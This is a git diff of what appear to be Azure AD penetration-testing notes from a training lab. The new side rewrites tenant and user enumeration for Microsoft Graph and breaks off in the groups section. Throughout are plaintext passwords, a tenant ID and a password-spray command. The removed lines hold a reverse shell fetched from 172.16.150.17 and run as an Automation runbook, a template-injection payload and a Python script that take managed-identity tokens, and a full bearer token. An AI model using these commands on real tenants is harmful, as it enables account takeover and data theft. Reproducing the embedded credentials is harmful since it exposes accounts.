@@ -1,1237 +1,1750 @@
-# Connect
-##
-## https://gist.github.com/Jasemalsadi/f7fac6a799763b8fd67737f0e7b63ae4
-##
+# ============================================================
+# CONNECT
+# ============================================================
 
 $passwd = ConvertTo-SecureString "NewUserSSecret@Pass61" -AsPlainText -Force
-$creds = New-Object System.Management.Automation.PSCredential ("AS-5945632460@oilcorptarsands.onmicrosoft.com", $passwd)
+$creds = New-Object System.Management.Automation.PSCredential(
+    "AS-5945632460@oilcorptarsands.onmicrosoft.com",
+    $passwd
+)
 Connect-AzAccount -Credential $creds
-#Connect-AzureAD -Credential $creds
-Connect-MgGraph -ClientSecretCredential $creds -TenantId bcdc6c96-4f80-4b10-8228-2e6477c71851 
+Connect-MgGraph `
+    -ClientSecretCredential $creds `
+    -TenantId bcdc6c96-4f80-4b10-8228-2e6477c71851
 
-## 1. Unauthenticated Recon:
-    #Get if Azure tenant is in use, tenant name and Federation
-    https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
-    #Get the Tenant ID
-    https://login.microsoftonline.com/[DOMAIN]/.wellknown/openid-configuration
-    #Validate Email ID by sending requests to
-    https://login.microsoftonline.com/common/GetCredentialType
+# ============================================================
+# 1. UNAUTHENTICATED RECON
+# ============================================================
 
-    Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
-    # Get tenant name, authentication, brand name (usually same as directory name) and domain name
-    Get-AADIntLoginInformation -UserName User8829957150027433301@defcorpspace.onmicrosoft.com
-    # Get tenant ID
-    Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
+# Get if Azure tenant is in use, tenant name and federation
+# https://login.microsoftonline.com/getuserrealm.srf?login=[USERNAME@DOMAIN]&xml=1
 
-    # Get tenant domains
-    Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
-    Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
-    Get-AADIntTenantDomains -Domain microsoft.com
+# Get the Tenant ID
+# https://login.microsoftonline.com/[DOMAIN]/.well-known/openid-configuration
 
-    # Get all the information
-    Invoke-AADIntReconAsOutsider -DomainName defcorpplanetary.onmicrosoft.com
+# Validate Email ID
+# https://login.microsoftonline.com/common/GetCredentialType
 
-    # Validate emails we gathered 
-    PS C:\AzAD\Tools> C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt
+Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
 
-    # microbust: open services 
-    Import-Module .\MicroBurst\MicroBurst.psm1
-    PS C:\AzAD\Tools> Invoke-EnumerateAzureSubDomains -base defcorpspace -Verbose
-    Invoke-EnumerateAzureBlobs -base defcorpspace -Verbose
+# Get tenant name, authentication, brand name and domain name
+Get-AADIntLoginInformation -UserName User8829957150027433301@defcorpspace.onmicrosoft.com
 
-    # Spray with password 
-    . C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1
-    Invoke-MSOLSpray -UserList .\emails.txt -Password V3ryH4rdt0Cr4ckN0OneC@nGu355ForT3stUs3r -Verbose
-## 2. authenticated Recon:
-    # 2.1 Azure PS Module
-        Import-Module C:\AZAD\Tools\AzureAD\AzureAD.psd1  
-        $creds = Get-Credential
-        Connect-AzureAD -Credential $creds  
-        # Get the current session state
-        Get-AzureADCurrentSessioninfo
-        # Get details of the current tenant
-        Get-AzureADTenantDetail
-        ############
-        # Get current user groups 
-        $currentUser = (Get-AzADUser -SignedIn)
-        $currentUser = Get-AzureADUser -ObjectId  AS-5945632460_oilcorptarsands.onmicrosoft.com#EXT#@oilcorpfracking.onmicrosoft.com
-        Get-AzureADUserOwnedObject -ObjectID $currentUser.UserPrincipalName
-        Get-AzureADDirectoryRole | Where-Object { (Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId).ObjectId -contains $currentUser.Id }
-        Get-AzureADUserMembership -ObjectId   $currentUser.UserPrincipalName
+# Get tenant ID
+Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
 
-        # Enumearte users
-        Get-AzureADUser -All $true
-        Get-AzureADUser -All $true | select UserPrincipalName
-        #Get users whose member of global admins : EXT means it's external user. So only admin is internal one. 
-        Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
-        #Enumerate a specific user
-        Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com
-        #Search for a user based on string in first characters of DisplayName or userPrincipalName (wildcard not supported)
-        Get-AzureADUser -SearchString "admin"
-        #Search for users who contain the word "admin" in their Display name:
-        Get-AzureADUser -All $true |?{$_.Displayname "admin" }    
-        # Search attributes for all users that contain the string "password":
-        Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
-        # All users who are synced from on-prem
-        Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
-        #All users who are from Azure AD
-        Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
-        #Objects created by any user (use -ObjectId for a specific user)
-        Get-AzureADUser | Get-AzureADUserCreatedObject
-        #Objects owned by a specific user
-        Get-AzureADUserOwnedObject -ObjectId test@defcorphq.onmicrosoft.com 
-        ############
+# Get tenant domains
+Get-AADIntTenantDomains -Domain defcorphq.onmicrosoft.com
+Get-AADIntTenantDomains -Domain deffin.onmicrosoft.com
+Get-AADIntTenantDomains -Domain microsoft.com
 
-        # Enumerate groups
-        Get-AzureADGroup -All $true
-        # Search for group by name
-        # Get Groups from on-premise
-        Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
-        Get-AzureADGroup -SearchString "admin" | fl *
-        # Get members of the group
-        Get-AzureADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e 
-        # Get groups and roles a user has:
-        Get-AzureADUser -SearchString 'User8829957150027433301' | Get-AzureADUserMembership
-        Get-AzureADUserMembership -ObjectId test@defcorphq.onmicrosoft.com
-        ############  
+# Get all the information
+Invoke-AADIntReconAsOutsider -DomainName defcorpplanetary.onmicrosoft.com
 
-        # Enumerate Roles
-        # Get all available role templates
-        Get-AzureADDirectoryroleTemplate
-        # Get all enabled roles (a built-in role must be enabled before usage)
-        Get-AzureADDirectoryRole
-        # For certain role (e.g. global administrator), geet the directory members
-        Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
-        # Get all custom roles
-        Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
-        Connect-AzureAD
-        Get-AzureADMSRoleDefinition  |?{$_.IsBuiltIn -ne $true}
-        ############
+# Validate emails
+C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt
 
-        # More indepth user groups and the groups member, apps details 
-        Get-AzureADApplication -All $true | % {
-            Get-AzureADApplication -ObjectId $_.ObjectId | fl *
-            Write-Output "-----------------------"
-            }
-    
-    
-        Get-AzureADUserMembership -ObjectId   $currentUser.UserPrincipalName | %{
-                    $_ | fl *
-                    Write-Output "-----------Members------------"
-                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
-                    Write-Output "-----------------------"
-            }
-        Get-AzureADUserMembership -ObjectId   frackingadmin@oilcorpfracking.onmicrosoft.com | %{
-                    $_ | fl *
-                    Write-Output "-----------Members------------"
-                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
-                    Write-Output "-----------------------"
-            }
-            
-        # less detailed    
-        Get-AzureADGroup -All $true | % {
-                    $_ | fl *
-                    Write-Output "-----------Members------------"
-                    Get-AzureADGroupMember -ObjectId $_.ObjectId
-                    Write-Output "-----------------------"
-            }
-        # more detailed
-        Get-AzureADGroup -All $true | % {
-                    $_ | fl *
-                    Write-Output "-----------Members------------"
-                    Get-AzureADGroupMember -ObjectId $_.ObjectId | fl *
-                    Write-Output "-----------------------"
-            } 
+# MicroBurst: open services
+Import-Module .\MicroBurst\MicroBurst.psm1
+Invoke-EnumerateAzureSubDomains -base defcorpspace -Verbose
+Invoke-EnumerateAzureBlobs -base defcorpspace -Verbose
 
-        # Enumerate Azure devices:
-        Get-AzureADDevice -All $true | fl * 
-        # Get Device configuration
-        Get-AzureADDeviceConfiguration | fl *
-        # List all active (not stale) devices
-        Get-AzureADDevice -All $true | ?{$_.ApproximateLastLogonTimeStamp -ne $null}
-        #List Registered owners of all the devices
-        Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner
-        Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}}
-        #List Registered users of all the devices
-        Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredUser
-        Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredUser -ObjectId $_.ObjectID){$_;$user.UserPrincipalName;"`n"}} 
-        #List devices owned by a user
-        Get-AzureADUserOwnedDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com        
-        #List devices registered by a user
-        Get-AzureADUserRegisteredDevice -ObjectId michaelmbarron@defcorphq.onmicrosoft.com        
-        #List devices managed using Intune
-        Get-AzureADDevice -All $true | ?{$_.IsCompliant -eq "True"} 
-        ############
+# Password spray
+. C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1
+Invoke-MSOLSpray `
+    -UserList .\emails.txt `
+    -Password V3ryH4rdt0Cr4ckN0OneC@nGu355ForT3stUs3r `
+    -Verbose
 
-        # Enumerate Azure Apps:
-        # Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal). An application object is the global representation of an app. 
-        Get-AzureADApplication -All $true
-        # Get all the details about an application
-        Get-AzureADApplication -ObjectId a1333e88-1278-41bf-8145- 155a069ebed0 | fl *
-        # Filtre App based on disaplay name
-        Get-AzureADApplication -All $true | ?{$_.DisplayName -match "app"} 
-        # List all the apps with app password, but password value is not shown -by design-:
-        Get-AzureADApplication -All $true | %{if(GetAzureADApplicationPasswordCredential -ObjectID $_.ObjectID){$_}}
-        # Get owner of an application
-        Get-AzureADApplication -ObjectId a1333e88-1278-41bf8145-155a069ebed0 | Get-AzureADApplicationOwner |fl *
-        # Get Apps where a User has a role (exact role is not shown) on them (apps)
-        Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
-        # Get Apps where a Group has a role (exact role is not shown) on them (apps)
-        Get-AzureADGroup -ObjectId 57ada729-a581-4d6f-9f16- 3fe0961ada82 | Get-AzureADGroupAppRoleAssignment | fl *
-        ############
+# ============================================================
+# 2. AUTHENTICATED RECON
+# ============================================================
 
-        # Enumerate Service Principals/ Enterprise Apps - SPs can be assigned a roles
-        # Get all service principals
-        Get-AzureADServicePrincipal -All $true
-        # Get all details about a service principal
-        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | fl *
-        # Get an service principal based on the display name
-        Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"}
-        # List all the service principals with an application password
-        Get-AzureADServicePrincipal -All $true | %{if(Get-AzureADServicePrincipalKeyCredential - ObjectID $_.ObjectID){$_}}
-        # Get owner of a service principal
-        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264 | Get-AzureADServicePrincipalOwner |fl *
-        # Get objects owned by a service principal
-        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45-053e7c37a264 | Get-AzureADServicePrincipalOwnedObject
-        # Get objects created by a service principal
-        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264 | Get-AzureADServicePrincipalCreatedObject  
-        # Get group and role memberships of a service principal
-        Get-AzureADServicePrincipal -ObjectId cdddd16e-2611- 4442-8f45-053e7c37a264 | GetAzureADServicePrincipalMembership |fl *
+# ============================================================
+# 2.1 MICROSOFT GRAPH (replaces deprecated AzureAD module)
+# ============================================================
 
-    # 2.2 AZ PS Module
-        # Connection 
-        Connect-AzAccount
-        ############
+# Install if needed:
+# Install-Module Microsoft.Graph -Scope CurrentUser
 
-        # General enumeration 
-        # Get the information about the current context (Account, Tenant,Subscription etc.)
-        Get-AzContext
-        # List all available contexts
-        Get-AzContext -ListAvailable
-        # Enumerate subscriptions accessible by the current user
-        Get-AzSubscription
-        # Enumerate all resources visible to the current user
-        Get-AzResource
-        # Enumerate all Azure RBAC role assignments
-        Get-AzRoleAssignment
-         ############
+Connect-MgGraph -Scopes `
+    "User.Read.All",
+    "Group.Read.All",
+    "Directory.Read.All",
+    "RoleManagement.Read.Directory",
+    "Device.Read.All",
+    "Application.Read.All",
+    "Policy.Read.All",
+    "UserAuthenticationMethod.ReadWrite.All"
 
-        # Enumerate users
-        # Enumerate all users
-        Get-AzADUser
-        # Enumerate a specific user
-        Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
-        # Search for a user based on string in first characters of DisplayName (wildcard not supported)
-        Get-AzADUser -SearchString "admin"
-        # Search for users who contain the word "admin" in their Display name:
-        Get-AzADUser |?{$_.Displayname -match "admin"}
-        # Get user role assigments (ouboun roles):
-        Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com
-        ############
+# --- Session info ---
+Get-MgContext
 
-        # Enumerate Groups
-        # List all groups
-        Get-AzADGroup
-        # Enumerate a specific group
-        Get-AzADGroup -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
-        # Search for a group based on string in first characters of DisplayName (wildcard not supported)
-        Get-AzADGroup -SearchString "admin" | fl *
-        # To search for groups which contain the word "admin" in their name:
-        Get-AzADGroup |?{$_.Displayname -match "admin"}
-        # Get members of a group
-        Get-AzADGroupMember -ObjectId 783a312d-0de2-4490-92e4-539b0e4ee03e
-        # Get all the application objects registered with the current tenant (visible in App Registrations in Azure portal)
-        ############
+# ---- Users ----
 
-        # Enumerate Apps
-        Get-AzADApplication
-        # Get all details about an application
-        Get-AzADApplication -ObjectId a1333e88-1278-41bf-8145-155a069ebed0
-        # Get an application based on the display name
-        Get-AzADApplication | ?{$_.DisplayName -match "app"}
-        # Get app services 
-        Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
-        # List all the apps with an application password
-        Get-AzADApplication | %{if(Get-AzADAppCredential -ObjectID $_.ID){$_}
-        # Function apps
-        Get-AzFunctionApp
-        # Get storage account
-        Get-AzStorageAccount |fl
-        # Key valuts
-        Get-AzKeyVault
-        ############
+# Get current signed-in user
+$currentUser = Get-MgUser -UserId (Get-MgContext).Account
 
-        # Enumerate Service Principals         
-        # Get all service principals
-        Get-AzADServicePrincipal
-        # Get all details about a service principal
-        Get-AzADServicePrincipal -ObjectId cdddd16e-2611-4442-8f45- 053e7c37a264
-        #Get a service principal based on the display name
-        Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
-    # 2.3 AZ cli
-        # Connection
-        az login 
-        # If the user has no permissions on the subscription
-        az login -u User8829957150027433301@defcorpspace.onmicrosoft.com -p [C@d8e6b6 --allow-no-subscriptions
-        az configure
-        # To find popular commands for VMs
-        az find "vm"
-        ############
+# Get all users
+Get-MgUser -All
 
-        # General Information 
-        # Get details of the current tenant (uses the account extension)
-        az account tenant list
-        # Get details of the current subscription (uses the account extension)
-        az account subscription list
-        # List the current signed-in user (whoami)
-        az ad signed-in-user show
-        ############
+# Get UPNs only
+Get-MgUser -All | Select-Object UserPrincipalName
 
-        # Enumerate users   
-        az ad user list
-        # select only username and show content in better format
-        az ad user list --query "[].[displayName]" -o table 
-        # Specific user
-        az ad user show --id test@defcorphq.onmicrosoft.com 
-        # Search for users who contain the word "admin" in their Display name (case sensitive):
-        az ad user list --query "[?contains(displayName,'admin')].displayName"
-        # Search for users , Case not senstive search 
-        az ad user list | ConvertFrom-Json | %{$_.displayName -match "admin"} 
-        # All users who are synced from on-prem
-        az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
-        # Users from azure
-        az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
-        # List username and displayname is custom names
-        az ad user list --query "[].{UPN:userPrincipalName, Name:displayName}" --output table
-        ############
-        
-        # Enumerate AAD Groups
-        # List all Groups
-        az ad group list
-        az ad group list --query "[].[displayName]" -o table   
-        # Enumerate a specific group using display name or object id
-        az ad group show -g "VM Admins"
-        az ad group show -g 783a312d-0de2-4490-92e4-539b0e4ee03e
-        # Search for admin Group (case not senstive)
-        az ad group list | ConvertFrom-Json | %{$_.displayName -match "admin"} 
-        # Groups from on-prem
-        az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
-        # Groups from azure ad
-        az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
-        # Get members of a group
-        az ad group member list -g "VM Admins" --query "[].[displayName]" -o table 
-        # Check if a user is member of the specified group
-        az ad group member check --group "VM Admins" --member-id b71d21f6-8e09-4a9d-932a-cb73df519787
-        # Get the object IDs of the groups of which the specified group is a member
-        az ad group get-member-groups -g "VM Admins" 
-        ############
-    
-        # VMs And Web Apps  
-        az vm list
-        az webapp list
-        # Filter only names: 
-        az vm list --query "[].[name]" -o table
-        az functionapp list --query "[].[name]"  -o table
-        # List VMs in table format
-        az vm list  -o table
-        # List  interfaces name for certain VM, e.g. networkInterfaces/bkpadconnect368
-        az vm nic list --vm-name bkpadconnect  --resource-group ENGINEERING
-        # Get al App Regisrations
-        az ad app list
-        az ad app list --query "[].[displayName]" -o table
-        # Get all details about an application using identifier uri, application id or object id
-        az ad app show --id a1333e88-1278-41bf-8145-155a069ebed0
-        # • Get an application based on the display name (Run from cmd)
-        az ad app list --query "[?contains(displayName,'app')].displayName"
-        # Search for certain app (case not sensttive)
-        az ad app list | ConvertFrom-Json | %{$_.displayName -match "slack"} 
-        # Get owner of an application
-        az ad app owner list --id a1333e88-1278-41bf-8145- 155a069ebed0 --query "[].[displayName]" -o table
-        # List app has passowrd creds
-        az ad app list --query "[?passwordCredentials !=null].displayName"  
-        # List apps that have key credentials (use of certificate authentication)
-        az ad app list --query "[?keyCredentials !=null].displayName"
-        ############
+# Get global admins
+$globalAdminRole = Get-MgDirectoryRole -Filter "DisplayName eq 'Global Administrator'"
+Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id | fl
 
-        # Enumerate Service Principals
-        # Get all SPs
-        az ad sp list --all
-        az ad sp list --all --query "[].[displayName]" -o table
-        # Get Details about certain SP
-        az ad sp show --id cdddd16e-2611-4442-8f45-053e7c37a264
-        # Get SP based on display name
-        az ad sp list --all --query "[?contains(displayName,'app')].displayName"
-        # Search for certain SP by name (case non senstive )
-        az ad sp list --all | ConvertFrom-Json | %{$_.displayName -match "app"}
-        # Get owner of SP
-        az ad sp owner list --id cdddd16e-2611-4442-8f45-053e7c37a264 --query "[].[displayName]" -o table 
-        # Get SPs owned by current user
-        az ad sp list --show-mine
-        # Get SPs with password creds
-        az ad sp list --all --query "[?passwordCredentials != null].displayName" 
-        # List apps that have key credentials (use of certificate authentication)
-        az ad sp list -all --query "[?keyCredentials != null].displayName"
-        ############
-        # Enumerate users utilizing AT from phishing consent Grant attack :
-        $URI = 'https://graph.microsoft.com/v1.0/users'
-        $RequestParams = @{
-         Method = 'GET'
-         Uri = $URI
-         Headers = @{
-         'Authorization' = "Bearer $Token"
-         }
-        }
-        (Invoke-RestMethod @RequestParams).value
-        # Token Riding of MI
-        # Get subscription id: 
-        $Token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyIsImtpZCI6ImtXYmthYTZxczh3c1RuQndpaU5ZT2hIYm5BdyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE3MDc4OTg5NzksIm5iZiI6MTcwNzg5ODk3OSwiZXhwIjoxNzA3OTg1Njc5LCJhaW8iOiJFMlZnWU9oaldCSjVPajdTOUhsTGZLZGpUdXBSQUE9PSIsImFwcGlkIjoiMmU5MWE0ZmUtYTBmMi00NmVlLTgyMTQtZmEyZmY2YWE5YWJjIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiMzBlNjc3MjctYThiOC00OGQ5LTgzMDMtZjI0NjlkZjk3Y2IyIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRrWklmM2tBdXRkUHVrUGF3ZmoyTUJQRUFBQS4iLCJzdWIiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJlNVVaUGp2V1YwaTdkaFZTX2luRUFBIiwidmVyIjoiMS4wIiwieG1zX2NhZSI6IjEiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.Zx_eMGGRmEh7l13sS_PICluwf51CZeBpBILgTxjIZogZNcyb3W0PBcNGnEay6AC4xYA5H3oJ7yKNUVwhsOZ0fs-j-olo5_PUMSlxWn0Wg0SN8p_UHKCbd73PHh4f7GQrA0SFlOIxnCljFrF6cBVEPYVJZR-ojPTkoAYzWEAz9AFIz3xmYEyYG5qvNKPLro-mYw11vnjI_wpse-qe2ypRhHQStz8tcLcE7DpQrnbrwgdd8fw5q8EF5wLZy0vTxWK--fIvRXhuvac4a9s7gAPSGCqNGSPrWHn1-u7oNjRtdTXl03vQK8RoOiZNpp1X4qlPWb4yzHhDXe27UXXa0SYc_g"
-        $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
-        $RequestParams = @{
-            Method = 'GET'
-            Uri = $URI
-            Headers = @{
-            'Authorization' = "Bearer $Token"
-            }
-           }
-           (Invoke-RestMethod @RequestParams).value 
-        # From subscription id, List all Resources   
-        $URI = 'https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resources?api-version=2020-10-01'
-        $RequestParams = @{
-            Method = 'GET'
-            Uri = $URI
-            Headers = @{
-            'Authorization' = "Bearer $Token"
-            }
-           }
-           (Invoke-RestMethod @RequestParams).value | fl 
-        # List permission of certain resrouce   
-        # /subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Exploration/providers/Microsoft.KeyVault/vaults/GISAppVault
-              # 2015 API version
-              $Token = (Get-AzAccessToken).Token
-              $URI ='https://management.azure.com/subscriptions/5e4a7f52-ddf6-422b-8aaf-161e342398d6/resourceGroups/AS-hmvxqpuyzl3343455/providers/Microsoft.KeyVault/vaults/asegfdnurqpj3343460/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
-              $RequestParams = @{
-                  Method = 'GET'
-                  Uri = $URI
-                  Headers = @{
-                  'Authorization' = "Bearer $Token"
-                  }
-                 }
-             (Invoke-RestMethod @RequestParams).value | fl 
-            # 2022 version (More results)
-            $KeyVault = Get-AzKeyVault
-            $SubscriptionID = (Get-AzSubscription).Id
-            $ResourceGroupName = $KeyVault.ResourceGroupName
-            $KeyVaultName = $KeyVault.VaultName
-            $URI = "https://management.azure.com/subscriptions/$SubscriptionID/resourceGroups/$ResourceGroupName/providers/Microsoft.KeyVault/vaults/$KeyVaultName/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-            $RequestParams = @{
-               Method = 'GET'
-               Uri = $URI
-               Headers = @{
-                'Authorization' = "Bearer $Access_Token"
-                }
-            }
-            $Permissions = (Invoke-RestMethod @RequestParams).value
-            $Permissions | fl *
-        
-        # if you graph token or you can reterive it, we can get apps MI has access to it: 
-            $Token = $graphToken
-            $URI = ' https://graph.microsoft.com/v1.0/applications'
-            $RequestParams = @{
-                Method = 'GET'
-                Uri = $URI
-                Headers = @{
-                'Authorization' = "Bearer $Token"
-                }
-               }
-            (Invoke-RestMethod @RequestParams).value
-             {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
-    # Curl using python : 
-    import os
-    import json
-    
-    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
-    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
-    
-    cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
-    
-    val = os.popen(cmd).read()
-    
-    print("[+] Management API")
-    print("Access Token: "+json.loads(val)["access_token"])
-    print("ClientID: "+json.loads(val)["client_id"])
-    
-    cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
-    
-    val = os.popen(cmd).read()
-    print("\r\n[+] Graph API")
-    print("Access Token: "+json.loads(val)["access_token"])
-    print("ClientID: "+json.loads(val)["client_id"])
-    
-    # Get access token for AAD graph = GraphAccessToken in Az PS , also token used for AzureAD PS
-    az account get-access-token --resource-type aad-graph
-    # Get Access token for ARM graph == -AccessToken  in AZ PS
-    az account get-access-token
-    # riding the session utilizing the token 
-    Connect-AzAccount -AccessToken $Token -GraphAccessToken $graphToken -AccountId 62e44426-5c46-4e3c-8a89-f461d5d586f2
-    
+# Get a specific user
+Get-MgUser -UserId test@defcorphq.onmicrosoft.com
 
-    # Lateral movement runbook  : 
-    # rev_shell_17.ps1 Content
-    iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.17 -Port 4448
-    # or :
-    powershell iex (New-Object Net.Webclient).downloadstring('http://172.16.150.17:82/InvokePowerShellTcp.ps1');Power -Reverse -IPAddress 172.16.150.17 -Port 4448
+# Search by display name prefix
+Get-MgUser -Search '"displayName:admin"' -ConsistencyLevel eventual
 
-    Import-AzAutomationRunbook -Name student17 -Path C:\AzAD\Tools\rev_shell_17.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -LogVerbose $true -LogProgress $true -Force
-    Publish-AzAutomationRunbook -RunbookName student17 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
-    nc -nvlp 4445
-    Start-AzAutomationRunbook -RunbookName student17 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose -Wait
-    # for any error and troubleshoot
-    Get-AzAutomationJobOutput -Id job_id  -ResourceGroupName Engineering -AutomationAccountName HybridAutomation -Stream "Any"
-    # Export runbook 
-    Export-AzAutomationRunbook -Name ManageAWS -AutomationAccountName ManageMultiCloud -ResourceGroupName Refining -Slot Published -OutputFolder C:\AzAD\Tools\
+# Search for "admin" anywhere in display name
+Get-MgUser -All | Where-Object { $_.DisplayName -match "admin" }
 
-    # Read Runbook Job output
-    $JobId = "742e4e1d-ece0-43d8-9544-0ccf0683a465"
-    $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/jobs/$JobId/output?api-version=2023-11-01"
-    $RequestParams = @{
-        Method = 'GET'
-        Uri = $URI
-        Headers = @{
-            'Authorization' = "Bearer $accesstoken"
+# Search all user properties for the string "password"
+Get-MgUser -All -Property * | ForEach-Object {
+    $u = $_
+    $u.PSObject.Properties | ForEach-Object {
+        if ($_.Value -match 'password') {
+            "$($u.UserPrincipalName) - $($_.Name) - $($_.Value)"
         }
     }
-    (Invoke-RestMethod @RequestParams)
-    # Get permissions on runbook
-    $URI = "https://management.azure.com/subscriptions/3604302a-3804-4770-a878-5fc5c142c8bc/resourceGroups/Refining/providers/Microsoft.Automation/automationAccounts/ManageMultiCloud/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
-    $RequestParams = @{
-        Method = 'GET'
-        Uri = $URI
-        Headers = @{
-            'Authorization' = "Bearer $accesstoken"
-        }
+}
+
+# Users synced from on-prem
+Get-MgUser -All | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null }
+
+# Users from Azure AD only
+Get-MgUser -All | Where-Object { $_.OnPremisesSecurityIdentifier -eq $null }
+
+# Objects owned by a specific user
+Get-MgUserOwnedObject -UserId test@defcorphq.onmicrosoft.com
+
+# Objects created by a specific user
+Get-MgUserCreatedObject -UserId test@defcorphq.onmicrosoft.com
+
+# Get current user's group memberships
+Get-MgUserMemberOf -UserId $currentUser.Id
+
+# Get roles assigned to current user
+Get-MgUserMemberOf -UserId $currentUser.Id |
+    Where-Object { $_.AdditionalProperties.'@odata.type' -eq '#microsoft.graph.directoryRole' }
+
+# ---- Groups ----
+
+# Get all groups
+Get-MgGroup -All
+
+# Get groups synced from on-prem
+Get-MgGroup -All | Where-Object { $_.OnPremisesSecurityIdentifier -ne $null }
+
+# Search for groups by name
+Get-MgGroup -Search '"displayName:admin"' -ConsistencyLevel eventual
+
+# Get members of a specific group
+Get-MgGroupMember -GroupId 783a312d-0de2-4490-92e4-539b0e4ee03e
+
+# Get groups and roles a user belongs to
